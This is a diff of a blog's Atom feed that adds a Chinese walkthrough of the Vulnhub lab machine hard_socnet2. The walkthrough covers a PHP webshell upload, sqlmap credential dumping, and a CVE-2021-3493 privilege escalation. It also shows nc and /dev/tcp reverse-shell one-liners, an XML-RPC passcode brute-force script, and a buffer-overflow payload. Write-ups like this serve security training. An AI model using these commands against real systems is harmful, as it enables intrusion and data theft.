@@ -8,13 +8,242 @@
     <author>
       <name>Clown</name>
     </author>
-    <updated>2023-07-14T16:00:00.000Z</updated>
+    <updated>2023-07-15T16:00:00.000Z</updated>
     <category term="Clown" />
     <category term="Web" />
     <category term="Pwn" />
     <category term="CTF" />
     <category term="AWD" />
     <category term="ACM" />
+    <entry>
+        <id>https://blog.xcu.icu/2023/07/16/hard_socnet2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
+        <title>hard_socnet2的靶机打靶记录</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/16/hard_socnet2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前面一直是中级和低级难度，这次挑战一个难度更高的，靶机下载地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ib3JlZGhhY2tlcmJsb2cvaGFyZF9zb2NuZXQyLm92YQ==&#34;&gt;https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;描述&#34;&gt;&lt;a href=&#34;#描述&#34; class=&#34;headerlink&#34; title=&#34;描述&#34;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;p&gt;难度：困难&lt;/p&gt;
+&lt;p&gt;涉及攻击方法:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;主机发现&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;端口扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SQL注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;文件上传&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;蚁剑上线&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;CVE-2021-3493&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;XMLRPC&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;逆向工程&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;动态调试&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;缓冲区溢出&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;漏洞利用代码编写&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;攻击目标：获得root权限&lt;/p&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;&lt;a href=&#34;#攻击流程&#34; class=&#34;headerlink&#34; title=&#34;攻击流程&#34;&gt;&lt;/a&gt;攻击流程&lt;/h2&gt;&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716103556494.png&#34; alt=&#34;image-20230716103556494&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到目标靶机的ip是192.168.13.33，接着扫描一下端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716103503331.png&#34; alt=&#34;image-20230716103503331&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这扫到端口，接着对端口进行一个服务的发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716104012080.png&#34; alt=&#34;image-20230716104012080&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里的22端口是一个7.6版本的OpenSSH服务，80端口是一个2.4.29版本的apache的httpd服务，8000端口是一个python2.7的httpd服务，这里还是通过浏览器去访问一下80和8000端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110008475.png&#34; alt=&#34;image-20230716110008475&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110024217.png&#34; alt=&#34;image-20230716110024217&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里8000端口显示GET方法不支持，所以这里就去抓包改一下请求方式尝试一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110433767.png&#34; alt=&#34;image-20230716110433767&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里暂时先放在这，先看80端口的服务，是一个登录页面也有一个注册功能这里先注册一个账号&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112245276.png&#34; alt=&#34;image-20230716112245276&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里注册成功后就登录到后台页面了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112337163.png&#34; alt=&#34;image-20230716112337163&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到有一个admin账号和testuser账号，这里可以看到有一个表单，这里提交尝试一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112807721.png&#34; alt=&#34;image-20230716112807721&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现这里会将提交的表单都放到下面的News Feed中，admin发布的一条消息&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;Hello friends! I&amp;#39;ve been working on a new script for monitoring servers. It&amp;#39;s called monitor.py. I&amp;#39;m running on this server I&amp;#39;ll post soon!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到这里有一个监控服务器的脚本，名字是monitor.py，暂时不知道这个脚本在哪，暂时没有利用的思路&lt;/p&gt;
+&lt;p&gt;这里去看一下个人主页，看看有没有什么有用的信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114416886.png&#34; alt=&#34;image-20230716114416886&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，他有一个上传一个头像的功能，于是我们这里测试一下有没有可能通过文件上传getshell&lt;/p&gt;
+&lt;h3 id=&#34;文件上传&#34;&gt;&lt;a href=&#34;#文件上传&#34; class=&#34;headerlink&#34; title=&#34;文件上传&#34;&gt;&lt;/a&gt;文件上传&lt;/h3&gt;&lt;p&gt;这里上传一个1.php尝试一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114731010.png&#34; alt=&#34;image-20230716114731010&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里尝试去访问一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114826145.png&#34; alt=&#34;image-20230716114826145&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到，文件上传是成功的，对于我上传的文件内容这里可以看一下，就是很简单的一句话木马&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114946651.png&#34; alt=&#34;image-20230716114946651&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里为了方便命令执行的回显，所以这里将phpinfo删除掉，再次上传&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120056417.png&#34; alt=&#34;image-20230716120056417&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里已经拿到了一个www-data的权限&lt;/p&gt;
+&lt;h3 id=&#34;sql注入&#34;&gt;&lt;a href=&#34;#sql注入&#34; class=&#34;headerlink&#34; title=&#34;sql注入&#34;&gt;&lt;/a&gt;sql注入&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120257063.png&#34; alt=&#34;image-20230716120257063&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在搜索的地方发现，当我输入单引号的时候这里产生了报错，并且将报错信息打印了出来，这里是有一个sql注入的点，于是我这里使用sqlmap来脱库，这里将http请求保存到一个文本中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120711520.png&#34; alt=&#34;image-20230716120711520&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里使用&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;sqlmap -r 1.txt -p query --dbs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120923740.png&#34; alt=&#34;image-20230716120923740&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到所有的数据库的名字，接着看表名&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;sqlmap -r 1.txt -p query -D socialnetwork --tables
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121037112.png&#34; alt=&#34;image-20230716121037112&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到有一个users表，这里去看这个表有哪些字段&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;sqlmap -r 1.txt -p query -D socialnetwork -T users --columns
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121257265.png&#34; alt=&#34;image-20230716121257265&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们登录是需要邮箱和密码，所以这里我们查看对应的两个字段信息&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;sqlmap -r 1.txt -p query -D socialnetwork -T users -C user_email,user_password --dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121603790.png&#34; alt=&#34;image-20230716121603790&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里使用了sqlmap的功能将密码碰撞了出来，这里就可以直接用这两个账号去登录了，这里先去登录这个admin账号，但是这里并没有版本进一步利用&lt;/p&gt;
+&lt;h3 id=&#34;提权&#34;&gt;&lt;a href=&#34;#提权&#34; class=&#34;headerlink&#34; title=&#34;提权&#34;&gt;&lt;/a&gt;提权&lt;/h3&gt;&lt;p&gt;还是回到刚刚拿到sell的地方，这里为了方便使用用蚁剑连接上&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143558283.png&#34; alt=&#34;image-20230716143558283&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里因为权限还是www-data，所以这里需要提权，这里看一下内核版本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143734442.png&#34; alt=&#34;image-20230716143734442&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见版本是4.15，这里看一下具体的版本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143850793.png&#34; alt=&#34;image-20230716143850793&#34;&gt;&lt;/p&gt;
+&lt;p&gt;去网上查询了一下相关的漏洞发现CVE-2021-3493可以利用，这里贴一个exp&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyaXNrZXRzL0NWRS0yMDIxLTM0OTM=&#34;&gt;briskets&amp;#x2F;CVE-2021-3493: Ubuntu OverlayFS Local Privesc (github.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144406222.png&#34; alt=&#34;image-20230716144406222&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里将exp放到靶机上，然后去编译运行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144531715.png&#34; alt=&#34;image-20230716144531715&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，这里是能够成功的，但是最后退出了，很显然是蚁剑的shell功能不全，这里去反弹一个shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc 192.168.13.249 2333 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144941811.png&#34; alt=&#34;image-20230716144941811&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里就成功拿到了一个shell，这里尝试去运行exp&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145022288.png&#34; alt=&#34;image-20230716145022288&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，这样就成功了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145044165.png&#34; alt=&#34;image-20230716145044165&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里就算是结束了，但是为什么说他的难度是困难呢，因为这台靶机制作时间是20年，没有这个cve可以直接利用，所以这里再从另一个角度去突破这台靶机&lt;/p&gt;
+&lt;p&gt;这里回到普通用户的权限，为了增强终端可用性，这里再使用python来获取一个新的shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145948951.png&#34; alt=&#34;image-20230716145948951&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;梅开二度&#34;&gt;&lt;a href=&#34;#梅开二度&#34; class=&#34;headerlink&#34; title=&#34;梅开二度&#34;&gt;&lt;/a&gt;梅开二度&lt;/h2&gt;&lt;h3 id=&#34;信息收集-1&#34;&gt;&lt;a href=&#34;#信息收集-1&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;这里去看一下哪些用户是可以执行shell的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150309081.png&#34; alt=&#34;image-20230716150309081&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到除了root外还有一个socnet用户是能执行shell的，这里也直接去看他的家目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150452522.png&#34; alt=&#34;image-20230716150452522&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看见monitor.py，刚刚再web页面提到这是一个管理员运行监视脚本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150659010.png&#34; alt=&#34;image-20230716150659010&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见这里确实有一个正在运行的monitor程序&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h3&gt;&lt;p&gt;这里也贴一下他的源码，我加了一点注释&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import SimpleXMLRPCServer
+import subprocess
+import random
+
+debugging_pass = random.randint(1000, 9999) # 生成一个随机数字
+
+def runcmd(cmd):
+    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = results.stdout.read() + results.stderr.read()
+    return output
+
+def cpu():
+    return runcmd(&amp;quot;cat /proc/cpuinfo&amp;quot;)  # 执行查看CPU信息的命令
+
+def mem():
+    return runcmd(&amp;quot;free -m&amp;quot;)  # 执行查看内存信息的命令
+
+def disk():
+    return runcmd(&amp;quot;df -h&amp;quot;)  # 执行查看磁盘信息的命令
+
+def net():
+    return runcmd(&amp;quot;ip a&amp;quot;)  # 执行查看网络信息的命令
+
+def secure_cmd(cmd, passcode):
+    if passcode == debugging_pass:
+        return runcmd(cmd)  # 如果传入的 passcode 与预设的 debugging_pass 相匹配，则执行指定的命令并返回结果
+    else:
+        return &amp;quot;Wrong passcode.&amp;quot;  # 如果 passcode 不匹配，则返回错误消息
+
+server = SimpleXMLRPCServer.SimpleXMLRPCServer((&amp;quot;0.0.0.0&amp;quot;, 8000))
+server.register_function(cpu)  # 注册 cpu() 函数
+server.register_function(mem)  # 注册 mem() 函数
+server.register_function(disk)  # 注册 disk() 函数
+server.register_function(net)  # 注册 net() 函数
+server.register_function(secure_cmd)  # 注册 secure_cmd() 函数
+
+server.serve_forever()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里根据导入的包可以看到使用了XMLRPC模块，这段代码的大致作用就是，创建了一个简单的XML-RPC服务器，服务监听再0.0.0.0的8000端口上（就是前面探测到的端口），再runcmd中创建了一个新的进程，执行cmd命令，最后通过outPut输出到页面，在secure_cmd函数中如果传入的passcode等于上面生成的随机数，就会调用runcmd函数，去执行命令，这里需要拿到这个随机数，这里写脚本去爆破一下这个数字&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import xmlrpc.client
+
+with xmlrpc.client.ServerProxy(&amp;quot;http://192.168.13.33:8000/&amp;quot;) as peoxy:
+    for i in range(1000,10000):
+        p = str(peoxy.secure_cmd(&amp;#39;ls&amp;#39;,i))
+        print(p+str(i))
+        if &amp;quot;Wrong&amp;quot; in p:
+            pass
+        else:
+            print(i)
+            break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716154626492.png&#34; alt=&#34;image-20230716154626492&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里爆出这个随机数为5727，这里改一下脚本执行whoami&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import xmlrpc.client
+
+with xmlrpc.client.ServerProxy(&amp;quot;http://192.168.13.33:8000/&amp;quot;) as peoxy:
+    p = str(peoxy.secure_cmd(&amp;#39;whoami&amp;#39;,5727))
+    print(p)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716154815507.png&#34; alt=&#34;image-20230716154815507&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，这里拿到的是socnet的shell，这里反弹一个shell出来&lt;/p&gt;
+&lt;h3 id=&#34;反弹shell&#34;&gt;&lt;a href=&#34;#反弹shell&#34; class=&#34;headerlink&#34; title=&#34;反弹shell&#34;&gt;&lt;/a&gt;反弹shell&lt;/h3&gt;&lt;p&gt;这里再改一下脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import xmlrpc.client
+
+with xmlrpc.client.ServerProxy(&amp;quot;http://192.168.13.33:8000/&amp;quot;) as peoxy:
+    p = str(peoxy.secure_cmd(&amp;#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.13.249/2444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#39;,5727))
+    print(p)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716155307918.png&#34; alt=&#34;image-20230716155307918&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里就成功拿到socnet一个shell，这里还是看这个目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716160607804.png&#34; alt=&#34;image-20230716160607804&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里还不是root用户，这里可以看到add_record文件是所属root的，这里可以尝试利用这个文件来提权，这里先查看一下这个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716160911104.png&#34; alt=&#34;image-20230716160911104&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;溢出&#34;&gt;&lt;a href=&#34;#溢出&#34; class=&#34;headerlink&#34; title=&#34;溢出&#34;&gt;&lt;/a&gt;溢出&lt;/h3&gt;&lt;p&gt;这里可以看到这个文件是一个32为的elf文件，统计目录下有一个peda的动态调试环境，这里可以使用gdb来调试这个程序&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716165631205.png&#34; alt=&#34;image-20230716165631205&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里输入2000个A，程序直接退出了，看来是没有溢出，这要都测试了一下，最后是在工作失误的备注中发现出现了溢出问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716170232543.png&#34; alt=&#34;image-20230716170232543&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，已经成功看到溢出问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716170622658.png&#34; alt=&#34;image-20230716170622658&#34;&gt;&lt;/p&gt;
+&lt;p&gt; 这里重点关注一下EIP（存放下一条指令的地址）这里EIP也被覆盖了，这里先测试一下溢出的临界区是多少&lt;/p&gt;
+&lt;p&gt;这里用gdb生成500个字符&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;pattern create 500
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用这500字符去溢出，然后就可以找到是哪些字符导致溢出&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716171850177.png&#34; alt=&#34;image-20230716171850177&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用gdb来查找溢出位置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716172704017.png&#34; alt=&#34;image-20230716172704017&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到是AAHA，是从第62为开始后4为溢出到EIP，这里测试一下先向EIP写入1234&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716172827755.png&#34; alt=&#34;image-20230716172827755&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以通过disas main看一下main函数的汇编&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173347518.png&#34; alt=&#34;image-20230716173347518&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到地址0x08048729位置使用了call函数调用了一个open的内置函数，很显然应该是打开文件的一个操作，这里下一个断点验证一下我们的猜测&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173655871.png&#34; alt=&#34;image-20230716173655871&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接使用r命令&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173843076.png&#34; alt=&#34;image-20230716173843076&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里接下来就要去执行这个call，这里使用s，单步执行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716174407845.png&#34; alt=&#34;image-20230716174407845&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见，这里在打开这个employee_records.txt文件，这里看到后面调用了一个vuln&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175051436.png&#34; alt=&#34;image-20230716175051436&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用点就在这里，这里使用info func来查看程序中的函数信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175329711.png&#34; alt=&#34;image-20230716175329711&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到两个函数，backdoor，vuln&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175451674.png&#34; alt=&#34;image-20230716175451674&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里调用了strcpy函数，这里的历史版本是存在缓冲区溢出的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175555968.png&#34; alt=&#34;image-20230716175555968&#34;&gt;&lt;/p&gt;
+&lt;p&gt;backdoor调用了system可以进行命令执行，并且在这之前调用了setuid，这里用这个起始地址放到EIP中&lt;/p&gt;
+&lt;p&gt;大致的逻辑就是，main函数中的vuln会调用strcpy，存在缓冲区溢出到backdoor，最后执行system函数，这里根据思路生成一个payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt; python -c &amp;quot;import struct;print(str(&amp;#39;a\n1\n1\n1\n&amp;#39;)+str(&amp;#39;A&amp;#39;*62)+str(struct.pack(&amp;#39;I&amp;#39;,0x08048676)))&amp;quot; &amp;gt; p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716182038560.png&#34; alt=&#34;image-20230716182038560&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+        <updated>2023-07-15T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>https://blog.xcu.icu/2023/07/15/Chronos%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
         <title>Chronos的靶机打靶记录</title>
@@ -7549,1530 +7778,5 @@ for i in range(100):
         <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
         <category term="nosql" scheme="https://blog.xcu.icu/tags/nosql/" />
         <updated>2023-03-01T04:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/</id>
-        <title>CTFshow-web入门php特性</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/"/>
-        <content type="html">&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
-&lt;p&gt;勉勉强强算是详解吧&lt;/p&gt;
-&lt;h1 id=&#34;前篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前篇&#34;&gt;#&lt;/a&gt; 前篇&lt;/h1&gt;
-&lt;h2 id=&#34;web89&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web89&#34;&gt;#&lt;/a&gt; web89&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
